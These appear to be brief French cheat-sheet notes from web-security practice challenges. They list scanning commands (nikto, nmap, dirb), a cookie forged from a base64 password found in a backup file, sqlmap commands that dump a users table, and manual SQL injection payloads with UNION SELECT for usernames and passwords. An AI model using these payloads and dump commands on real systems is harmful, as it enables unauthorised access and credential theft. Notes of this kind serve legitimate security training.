
HTTP - Test connexion utilisation du debugguer pour voir les trames réseau. 
	Passer de GET à OPTION pour voir la réponse.

# Tool
nikto -h <URL>
nmap -p 1-65535 -sV -sS -T4 <IP>
dirb 
Encode / Decode : https://www.root-me.org/spip.php?page=outils&inc=code_decode&lang=en
?? https://www.root-me.org/en/Tools/System/pwntools

# Neonazi à l'intérieur. 
Récupération page de login.php.old, mot de passe base64, décode sur base64decode.org
Modification requête POST : Cookie: galerie=root:YXplcnR5NjU0JiY=
Réponse dans "l'inspector" ...
	
# sqlmap	
sqlmap -u "<URL>"
sqlmap -r <BurpFile>
sqlmap -r <BurpFile> --tables
sqlmap -r <BurpFile> -T users --dump

Test SQL injection manual
http://mywebsite.php/login.php?id=1'
http://mywebsite.php/login.php?id='1
	Si la requête renvoi une erreur alors injectable
http://mywebsite.php/login.php?id=1 ORDER BY 15--
	Error out of range should be between 1 and xx
http://mywebsite.php/login.php?id=1 OR 1=1 UNION SELECT username, password, 3, from users

# gcc
apt-install libc6-dev-i386
